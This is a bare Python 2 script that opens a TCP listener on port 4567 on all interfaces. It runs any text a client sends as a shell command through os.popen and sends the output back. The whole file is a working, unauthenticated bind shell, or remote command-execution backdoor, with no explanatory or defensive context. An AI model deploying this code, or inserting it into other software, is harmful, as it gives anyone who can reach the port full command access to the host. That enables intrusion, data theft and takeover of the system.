#!/usr/bin/env python
import socket,os
host=''
port=4567
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind((host,port))
s.listen(1)
print "Server is running on port %d; press ctrl-c to terminate." % port
while 1:
    clientsock,clientaddr=s.accept()
    print "connect from %s" % str(clientaddr)
    clientfile=clientsock.makefile('rw',0)
    data=clientsock.recv(1024)
    command=os.popen(data).read()
    clientfile.write("%s" % command)
    clientfile.close()
    clientsock.close()
